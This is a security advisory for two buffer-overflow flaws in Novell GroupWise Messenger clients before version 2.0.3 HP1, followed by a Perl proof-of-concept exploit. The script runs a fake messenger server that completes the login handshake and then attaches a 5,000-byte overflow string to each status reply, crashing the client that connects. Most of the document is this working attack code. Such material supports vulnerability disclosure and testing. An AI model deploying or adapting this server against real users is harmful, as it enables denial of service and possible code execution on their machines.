source: http://www.securityfocus.com/bid/29602/info

Novell GroupWise Messenger is prone to two buffer-overflow vulnerabilities because it fails to adequately bounds-check user-supplied data before copying it to an insufficiently sized buffer.

Attackers can exploit these issues to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Versions prior to Novell GroupWise Messenger 2.0.3 HP1 are vulnerable.

#!/usr/bin/perl -w

##
#Simple fake groupwise msn server.
#Date: 07/02/2008
#[ISR] - www.infobyte.com.ar
#Author: Francisco Amato
##

use strict;
use IO::Socket;
use Data::Dump qw(dump);

my $port=8300;
my $conn="HTTP/1.0 200 \r\nDate: Sat, 12 Jan 2008 01:28:59 GMT\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n\n\0\20\0\0\0nnmFileTransfer\0\2\0\0\x000\0\n\0\t\0\0\0nnmQuery\0\2\0\0\x001\0\n\0\13\0\0\0nnmArchive\0\2\0\0\x001\0\n\0\24\0\0\0nnmPasswordRemember\0\2\0\0\x001\0\n\0\17\0\0\0nnmMaxContacts\0\4\0\0\x00150\0\n\0\16\0\0\0nnmMaxFolders\0\3\0\0\x0050\0\n\0\r\0\0\0nnmBroadcast\0\2\0\0\x001\0\n\0\23\0\0\0nnmPersonalHistory\0\2\0\0\x001\0\n\0\r\0\0\0nnmPrintSave\0\2\0\0\x001\0\n\0\17\0\0\0nnmChatService\0\2\0\0\x001\0\n\0\3\0\0\0CN\0\a\0\0\0ISR000\0\n\0\b\0\0\0Surname\0\6\0\0\0Amato\0\n\0\n\0\0\0Full Name\0\20\0\0\0Client Name    \0\n\0\13\0\0\0Given Name\0\n\0\0\0Client   \0\n\0\r\0\0\0nnmLastLogin\0\13\0\0\x001200112090\0\t\0\30\0\0\0NM_A_FA_CLIENT_SETTINGS\0\1\0\0\0\n\0\21\0\0\0Novell.AskToSave\0\2\0\0\x001\0\t\0\e\0\0\0NM_A_FA_INFO_DISPLAY_ARRAY\0\1\0\0\0\n\0\27\0\0\0Internet EMail Address\0\26\0\0\0xxxxx\@xxxxxxxx.com.xx\0\b\0\16\0\0\0NM_A_UD_BUILD\0\a\0\0\0\n\0\13\0\0\0NM_A_SZ_DN\x001\0\0\0CN=ISR000,OU=IT,OU=ISR_,OU=BA,OU=AR,O=INFOBYTEXX\0\t\0\24\0\0\0NM_A_FA_AU_SETTINGS\0\1\0\0\0\n\0\22\0\0\0nnmClientDownload\0\2\0\0\x000\0\b\0\22\0\0\0NM_A_UD_KEEPALIVE\0\n\0\0\0\n\0\24\0\0\0NM_A_SZ_RESULT_CODE\0\2\0\0\x000\0\n\0\27\0\0\0NM_A_SZ_TRANSACTION_ID\0\2\0\0\x001\0\0";
my $resp="HTTP/1.0 200 \r\nDate: Fri, 04 Jan 2008 09:55:40 GMT\r\nPragma: no-cache\r\nCache-Control: no-cache\r\n\r\n\n\0\24\0\0\0NM_A_SZ_RESULT_CODE\0\2\0\0\x000\0\n\0\27\0\0\0NM_A_SZ_TRANSACTION_ID\0\2\0\0\x00c0d3\0\0";
my $crash="A"x5000;
#initial
&main;

##########################################################################
# FUNCTION	main
# RECEIVES
# RETURNS
# EXPECTS
# DOES		application's startup
sub main {

    #ignore child's process
    $SIG{CHLD} = 'IGNORE';

    my $listen_socket = IO::Socket::INET->new(LocalPort => $port,
					      Listen => 10,
					      Proto => 'tcp',
					      Reuse => 1);

    die "Cant't create a listening socket: $@" unless $listen_socket;

    print "[ISR] www.infobyte.com.ar - Francisco Amato\n";
    print "[Groupwise Messager] Fake Server ready. Waiting for connections ... \n";

    #esperar conexiones
    while (my $connection = $listen_socket->accept){

	my $child;
	# crear el fork para salir
	die "Can't fork: $!" unless defined ($child = fork());

	#child
	if ($child == 0){

	    #close socket
	    $listen_socket->close;

	    #process request
	    &client($connection);

	    exit 0;
	}
	#father
	else{

	    warn "Connecton recieved ... ",$connection->peerhost,"\n";

	    #close connection
	    $connection->close();

	}
    }
}
##########################################################################
# FUNCTION	client
# RECEIVES
# RETURNS
# EXPECTS
# DOES		process client request
sub client{

    my ($socket) = @_;
    my $st=2; #initial code

    $|=1;

    my $rp;
    my $data = <$socket>;
    pdata($data);
    if ($data =~ /POST \/login/){
	$data = <$socket>;
	pdata($data);
	$data = <$socket>;
	pdata($data);
	$data = <$socket>;
	pdata($data);
	printf $socket $conn;
	pdata($conn,1);
	while ($data = <$socket>){ #commands
	    if ($data =~ /POST \/setstatus/){

		pdata($data);
		$data = <$socket>;
		pdata($data);
		$data = <$socket>;
		pdata($data);

		$rp=$resp;
		$rp =~ s/c0d3/$st/g;
		$rp .=$crash;
		printf $socket $rp;
		pdata($rp,1);
		$st++;

	    }else{
		pdata("ELSE -". $data);
	    }
	}
    }
    close($socket);

}
##########################################################################
# FUNCTION	pdata
# RECEIVES
# RETURNS
# EXPECTS
# DOES		debug information
sub pdata {
    my ($data,$orden) =@_;
    if ($orden){
	print "[SERVER] - ";
    }else{
	print "[CLIENT] - ";
    }
    print dump($data) . "\n";
}